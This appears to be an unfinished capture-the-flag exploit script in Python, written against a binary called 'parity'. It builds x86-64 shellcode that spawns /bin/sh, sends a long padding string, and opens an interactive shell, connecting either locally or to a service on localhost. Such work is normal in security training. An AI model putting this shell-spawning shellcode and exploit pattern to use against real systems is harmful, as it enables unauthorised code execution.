#!/usr/bin/env python
import ptrlib as ptr
import sys

elf = ptr.ELF("./parity")
# libc = ptr.ELF("")
# ld = ptr.ELF("")


def connect():
    if len(sys.argv) > 1 and sys.argv[1] == "remote":
        return ptr.Socket("localhost", 5000)
    else:
        return ptr.Process(elf.filepath)


def unwrap(x):
    if x is None:
        ptr.logger.error("unwrap failed")
        exit(1)
    else:
        return x


def main():
    io = connect()

    sc = b""
    sc += b"\x48\x31\xd2"  # 2 // xor    %rdx, %rdx
    # --------------|
    sc += (
        b"\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68"  # // mov	$0x68732f6e69622f2f, %rbx
    )
    sc += b"\x48\xc1\xeb\x08"  # // shr    $0x8, %rbx
    sc += b"\x53"  # // push   %rbx
    sc += b"\x48\x89\xe7"  # // mov    %rsp, %rdi
    sc += b"\x50"  # // push   %rax
    sc += b"\x57"  # // push   %rdi
    sc += b"\x48\x89\xe6"  # // mov    %rsp, %rsi
    sc += b"\xb0\x3b"  # // mov    $0x3b, %al
    sc += b"\x0f\x05"  # // syscall

    input(">>")
    io.sendline("A" * 0x2000)
    input(">>")

    io.sh()


if __name__ == "__main__":
    main()
